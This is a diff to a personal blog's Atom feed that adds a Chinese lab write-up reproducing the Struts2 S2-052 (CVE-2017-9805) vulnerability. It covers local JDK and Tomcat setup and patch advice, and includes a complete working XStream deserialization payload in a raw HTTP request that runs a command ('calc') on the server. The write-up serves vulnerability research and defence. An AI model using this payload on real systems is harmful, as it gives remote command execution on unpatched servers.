@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>Y-HKL&#39;Blog</title>
+  <title>Y-HKL&#39;s Blog</title>
   
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://y-hkl.top/"/>
-  <updated>2017-09-02T06:55:55.285Z</updated>
+  <updated>2017-09-08T08:35:11.342Z</updated>
   <id>http://y-hkl.top/</id>
   
   <author>
@@ -14,6 +14,44 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>s2-052复现</title>
+    <link href="http://y-hkl.top/2017/09/08/s2-052%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://y-hkl.top/2017/09/08/s2-052复现/</id>
+    <published>2017-09-08T07:35:17.000Z</published>
+    <updated>2017-09-08T08:35:11.342Z</updated>
+    
+    <content type="html"><![CDATA[<p>struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究</p>
+<h2 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h2><p>问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反<br>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12</p>
+<h2 id="s2-052-POC"><a href="#s2-052-POC" class="headerlink" title="s2-052 POC"></a>s2-052 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;calc&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
+<p>注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;command&gt;</div><div class="line">&lt;string&gt;</div><div class="line">calc</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/command&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h2><h3 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h3><p>1.下载JDK<br>在官网上下载JDK <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>我是在windows上搭建的所以，下载windows版本的<br>2.配置环境变量<br>2.1 新建系统变量：<br>变量名:JAVA_HOME<br>变量值:你的JDK安装目录<br>2.2 再新建系统变量：<br>变量名:CLASSPATH<br>值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN<br>注意：前面的点号<br>2.3 修改PATH变量<br>变量名:PATH<br>值: ;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;<br>注意：前面的分号，将此值添加到，path变量值的最后面</p>
+<h3 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h3><h4 id="下载Tomcat"><a href="#下载Tomcat" class="headerlink" title="下载Tomcat"></a>下载Tomcat</h4><p>在官网上下载Tomcat <a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="external">http://tomcat.apache.org/download-90.cgi</a><br>下载你需要的版本<br>下载完成以后解压到你想解压的目录就可以了</p>
+<h4 id="配置Tomcat的环境变量"><a href="#配置Tomcat的环境变量" class="headerlink" title="配置Tomcat的环境变量"></a>配置Tomcat的环境变量</h4><p>新建Tomcat环境变量<br>变量名:TOMCAT_HOME<br>变量值:你的TOMCAT所在目录</p>
+<h4 id="启动Tomcat"><a href="#启动Tomcat" class="headerlink" title="启动Tomcat"></a>启动Tomcat</h4><p>打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；<br>如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查</p>
+<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
+<h3 id="下载受影响的struts2版本"><a href="#下载受影响的struts2版本" class="headerlink" title="下载受影响的struts2版本"></a>下载受影响的struts2版本</h3><p>1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br>2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。<br>3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 <a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a> 会跳转，然后出现下面的页面<br><img src="/upload_img/s2_052_1.png" alt=""></p>
+<h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>进入编辑页面<br><img src="/upload_img/s2_052_2.png" alt=""><br>设置抓包，点击提交按钮<br><img src="/upload_img/s2_052_3.png" alt=""><br><img src="/upload_img/s2_052_4.png" alt=""><br>修改Content-Type和POST提交的数据<br><img src="/upload_img/s2_052_5.png" alt=""><br>可以看到计算器已经调用出来<br><img src="/upload_img/s2_052_6.png" alt=""></p>
+<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>1.升级Struts到2.5.13最新版本。<br>2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs</p>
+<h2 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h2><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究&lt;/p&gt;
+&lt;h2 id=&quot;s2-052漏洞介绍&quot;&gt;&lt;a href=&quot;#s2-052漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;s2-052漏洞介绍&quot;&gt;&lt;/a&gt;s2-0
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
+    
+      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
   
   <entry>
     <title>搭建shadowsocks服务</title>
@@ -151,9 +189,9 @@
       <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="脑图" scheme="http://y-hkl.top/tags/%E8%84%91%E5%9B%BE/"/>
-    
       <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="脑图" scheme="http://y-hkl.top/tags/%E8%84%91%E5%9B%BE/"/>
     
   </entry>
   
